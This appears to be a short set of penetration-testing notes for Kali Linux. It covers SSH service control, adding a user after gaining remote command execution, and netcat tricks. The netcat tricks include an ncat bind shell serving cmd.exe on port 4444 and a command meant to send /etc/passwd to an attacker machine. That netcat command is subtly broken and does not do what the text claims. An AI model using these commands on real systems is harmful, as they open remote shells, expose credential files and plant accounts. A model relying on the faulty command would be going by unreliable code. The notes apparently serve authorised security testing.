### Service Management in Kali Linux

Network Services do not start at boot time in kali.

` Service ssh start `

` netstat -antp | grep sshd `

### Setting boot persistence in Kali
Will automatically start SSH on boot time

` update-rc.d ssh enable`

### Adduser in Linux
Comes handy when you have remote command execution.

` adduser alice `

Putting '&' at the end of command will put the execution in background mode

### Netcat

On the attacker machine try to set listening port to 80 / 443 or some standard port as there may be host level firewall blocking the traffic.

Following command will execute the later part of command and will send the output to your kali terminal (may help when shell is breaking due to any problem)

` nc -vn 192.168.31.25 4444 | cat /etc/passwd `

> **Security Alert** During the corporate engagements, always use Ncat with SSL. Transferring sensitive command outputs in plain test is a bad. Someone may capture your /etc/shadow file or SSH key which you are trying to read from the target.

` ncat -lvp 4444 -e cmd.exe - allow 192.168.56.35 -ssl `
